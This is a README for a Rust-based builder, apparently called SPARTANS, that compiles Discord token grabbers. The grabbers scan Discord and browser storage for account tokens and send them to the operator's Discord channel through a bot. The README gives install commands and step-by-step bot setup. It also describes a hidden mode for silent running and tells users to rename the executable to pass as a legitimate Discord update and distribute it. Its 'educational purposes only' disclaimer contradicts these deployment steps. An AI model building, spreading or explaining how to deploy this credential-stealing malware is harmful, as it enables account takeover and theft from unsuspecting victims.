# FIRNYKA

<div align="center">

![Rust](https://img.shields.io/badge/Rust-1.93+-orange.svg)
![Platform](https://img.shields.io/badge/Platform-Windows-blue.svg)
![License](https://img.shields.io/badge/License-MIT-green.svg)

**Compile Discord token grabbers with bot integration**

[Installation](#-installation) • [Usage](#-usage) • [Features](#-features) • [Troubleshooting](#-troubleshooting)

</div>

---

## ⚡ Quick Start

```powershell
# Download and run installer (as Administrator)
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YOUR_USERNAME/spartans/main/install.bat" -OutFile "install.bat"
.\install.bat
```

## 📦 What Gets Installed

The installer automatically:
- ✅ Downloads source files from GitHub
- ✅ Installs MinGW (if needed)
- ✅ Installs Rust (if needed)
- ✅ Compiles SPARTANS.exe
- ✅ Creates proper folder structure

**Result:**
```
SPARTANS/
├── SPARTANS.exe                    # Main program
└── utilitys/
    └── token-grabber/
        └── main.rs                 # Grabber source (for compilation)
```

---

## 🎯 Features

### Token Grabber
- 🔍 **Multi-Browser Support:** Discord, Chrome, Edge, Brave, Opera, Opera GX
- 🔐 **Token Validation:** Validates tokens via Discord API
- 📱 **Bot Integration:** Sends tokens directly to your Discord channel
- 💾 **Backup:** Saves tokens to Desktop automatically
- 👻 **Hidden Mode:** Compile with hidden console window

### SPARTANS Compiler
- ⚙️ **Easy Configuration:** Configure Discord bot in 30 seconds
- 🎨 **Custom Icons:** Add .ico files to compiled executables
- 🔨 **Optimized Build:** Full LTO + strip for smallest size
- 📝 **Custom Names:** Name your compiled files anything

---

## 🚀 Installation

### Method 1: Quick Install (Recommended)

1. **Download installer:**
   ```powershell
   Invoke-WebRequest -Uri "https://raw.githubusercontent.com/YOUR_USERNAME/spartans/main/install.bat" -OutFile "install.bat"
   ```

2. **Run installer:**
   ```batch
   install.bat
   ```
   
3. **Wait** (30-90 seconds for compilation)

4. **Done!** SPARTANS.exe is in `SPARTANS\` folder

### Method 2: Manual Install

**Requirements:**
- Windows 10/11
- Administrator privileges

**Steps:**

1. **Install Rust:**
   ```
   Download: https://rustup.rs
   Run: rustup-init.exe
   Choose: 1 (default installation)
   ```

2. **Install MinGW:**
   ```
   Download: https://github.com/niXman/mingw-builds-binaries/releases
   Extract to: C:\Users\YourUser\.mingw64
   ```

3. **Add Rust target:**
   ```batch
   rustup target add x86_64-pc-windows-gnu
   ```

4. **Download files:**
   ```
   - main.rs
   - grabber.rs
   - install.bat
   ```

5. **Run installer:**
   ```batch
   install.bat
   ```

---

## 🎮 Usage

### Step 1: Configure Discord Bot

1. **Create Discord Bot:**
   - Go to https://discord.com/developers/applications
   - Click "New Application"
   - Go to "Bot" → "Reset Token" → Copy token
   - Enable these intents:
     - ☑️ Presence Intent
     - ☑️ Server Members Intent
     - ☑️ Message Content Intent

2. **Invite Bot to Server:**
   - Go to OAuth2 → URL Generator
   - Select: `bot`
   - Select permissions:
     - Send Messages
     - Embed Links
   - Copy URL → Open in browser → Select server

3. **Get Channel ID:**
   - Enable Developer Mode: User Settings → Advanced → Developer Mode
   - Right-click channel → Copy Channel ID

4. **Configure in SPARTANS:**
   ```
   SPARTANS.exe
   [1] Configure Discord Bot
   
   > Paste bot token
   > Paste channel ID
   
   [OK] Configuration saved!
   ```

### Step 2: Compile Token Grabber

```
SPARTANS.exe
[2] Compile Archive
[1] Compile Token Grabber

Options:
[1] Window Mode:
    - Visible: Shows console (for testing)
    - Hidden: Runs silently (for deployment)

[2] Output Name:
    - Enter name without .exe
    - Example: "Discord_Setup"

[3] Icon File (optional):
    - Must be .ico format
    - Path: C:\path\to\icon.ico

[4] Start Compilation
    ⏳ Wait 5-10 seconds
    ✅ Done!
```

**Output location:** `SPARTANS\compiled\YourName.exe`

### Step 3: Deploy & Test

1. **Test locally first:**
   - Run compiled .exe on your PC
   - Check Desktop for `discord_tokens.txt`
   - Check Discord channel for bot message

2. **Deploy:**
   - Rename to look legitimate: `Discord_Update.exe`, `Setup.exe`
   - Add custom icon (optional)
   - Distribute compiled .exe

---

## 🔍 What the Grabber Scans

| Application | Scan Locations |
|------------|----------------|
| **Discord Desktop** | AppData & LocalAppData |
| **Discord Canary** | AppData |
| **Discord PTB** | AppData |
| **Chrome** | All profiles + Guest |
| **Brave** | All profiles + Guest |
| **Edge** | All profiles + Guest |
| **Opera** | Standard + Opera GX |

**Files scanned:** `.ldb` and `.log` files in `Local Storage\leveldb`

---

## 🛡️ Token Validation

Grabber validates tokens by:
1. **Format check:** Verifies 3-part structure (base64.base64.base64)
2. **Length check:** 50-100 characters
3. **Prefix check:** Must start with `MT`, `OD`, or `N`
4. **MFA support:** Detects `mfa.` tokens

---

## 🔧 Troubleshooting

### ❌ "Grabber source not found"

**Problem:** SPARTANS can't find the grabber source file

**Solutions:**
1. Make sure you're running SPARTANS.exe from the `SPARTANS\` folder
2. Check that `utilitys\token-grabber\main.rs` exists
3. Reinstall using `install.bat`
4. Verify file structure:
   ```
   SPARTANS/
   ├── SPARTANS.exe
   └── utilitys/
       └── token-grabber/
           └── main.rs    ← This must exist
   ```

### ❌ "Bot not configured"

**Problem:** Discord bot credentials not set

**Solutions:**
1. Run SPARTANS.exe → [1] Configure Discord Bot
2. Enter valid bot token and channel ID
3. Make sure bot is invited to server
4. Recompile grabber after configuring

### ❌ Compilation fails

**Problem:** Rust compilation errors

**Solutions:**
1. Check MinGW: `C:\Users\YourUser\.mingw64\bin\gcc.exe` exists
2. Check Rust: Run `rustc --version` in CMD
3. Check target: Run `rustup target list --installed`
4. Reinstall everything with `install.bat`

### ❌ No tokens found

**Problem:** Grabber runs but finds no tokens

**Reasons:**
- No Discord/browser with tokens installed
- Discord is running (locks database files)
- Tokens are in different profile
- Using Discord in browser only

**Solutions:**
1. Close Discord completely before running
2. Check all browser profiles
3. Make sure Discord desktop client is installed
4. Log into Discord at least once before testing

### ❌ Bot doesn't send messages

**Problem:** Tokens found but not sent to Discord

**Solutions:**
1. Verify bot token is correct
2. Check channel ID is correct
3. Make sure bot has permissions:
   - Send Messages
   - Embed Links
4. Check bot is in the server
5. Try sending a test message: `/test` in channel

---

## 📁 Project Structure

```
spartans/                       # GitHub repo
├── main.rs                    # SPARTANS main program source
├── grabber.rs                 # Token grabber source
├── install.bat                # Automated installer
├── quick-install.bat          # One-command installer
├── README.md                  # This file
└── .gitignore                 # Git ignore rules

After installation:
SPARTANS/                       # Local installation
├── SPARTANS.exe               # Compiled main program
├── bot_config.txt             # Bot configuration (auto-created)
├── utilitys/
│   └── token-grabber/
│       └── main.rs            # Grabber source for compilation
└── compiled/                  # Output folder (auto-created)
    └── YourName.exe          # Compiled grabbers
```

---

## ⚙️ Advanced Configuration

### Compile Options

**Window Mode:**
```rust
// Visible (default)
// Shows console window for debugging

// Hidden
#![windows_subsystem = "windows"]
// Runs completely silently
```

**Custom Icon:**
```batch
# Convert image to .ico:
# Use online converter: https://convertio.co/png-ico/
# Or use GIMP/Photoshop

# Then in SPARTANS:
[3] Icon File
> C:\path\to\icon.ico
```

**Optimization:**
```toml
[profile.release]
opt-level = "z"        # Smallest size
lto = true             # Link-time optimization
strip = true           # Remove debug symbols
codegen-units = 1      # Slower compile, smaller binary
panic = "abort"        # Smaller panic handler
```

---

## 🔐 Security & Ethics

### ⚠️ IMPORTANT DISCLAIMER

This tool is for **EDUCATIONAL PURPOSES ONLY**.

**Legal Use Cases:**
- ✅ Testing your own systems
- ✅ Security research with permission
- ✅ Educational demonstrations
- ✅ Penetration testing (with authorization)

**Illegal Use Cases:**
- ❌ Unauthorized access to others' accounts
- ❌ Identity theft
- ❌ Data breach
- ❌ Violating Discord Terms of Service

**You are responsible for:**
- Ensuring you have permission to test systems
- Following all applicable laws
- Respecting Discord's Terms of Service
- Using this tool ethically

**The authors are NOT responsible for:**
- Misuse of this software
- Any illegal activities
- Damages caused by improper use
- Violations of Terms of Service

---

## 📜 License

```
MIT License

Copyright (c) 2024 SPARTANS

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

---

## 📧 Support

- **Issues:** https://github.com/YOUR_USERNAME/spartans/issues
- **Discussions:** https://github.com/YOUR_USERNAME/spartans/discussions
- **Wiki:** https://github.com/YOUR_USERNAME/spartans/wiki

---

<div align="center">

**Made with ❤️ and Rust 🦀**

⭐ Star this repo if you find it useful!

</div>
